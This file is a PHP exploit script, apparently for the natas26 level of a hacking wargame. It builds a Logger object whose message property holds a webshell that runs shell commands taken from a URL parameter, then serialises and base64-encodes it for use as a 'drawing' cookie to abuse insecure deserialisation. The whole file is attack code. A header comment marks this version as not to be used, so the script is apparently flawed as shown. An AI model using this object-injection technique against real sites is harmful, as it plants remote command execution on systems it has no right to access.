// DO NOT USE, use natas26_payload_fixed.php

<?php
// Define the Logger class as in the target application
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;

    public function __construct($file) {
        $this->initMsg = "#--session started--#\n";
        $this->exitMsg = "#--session end--#\n";
        $this->logFile = $file;
    }
}

// Choose a filename (try to write to a web-accessible directory if possible)
$filename = 'webshell'; // Adjust path as needed

// The PHP code you want to inject (webshell)
$webshell = "<?php system(\$_GET['cmd']); ?>";

// Create the malicious Logger object
$logger = new Logger($filename);

// Overwrite the initMsg property with your webshell code
$reflection = new ReflectionClass($logger);
$property = $reflection->getProperty('initMsg');
$property->setAccessible(true);
$property->setValue($logger, $webshell);

// Serialize and base64-encode the object
$payload = base64_encode(serialize([$logger]));

echo "Set your 'drawing' cookie to this value:\n";
echo $payload . "\n";
?>
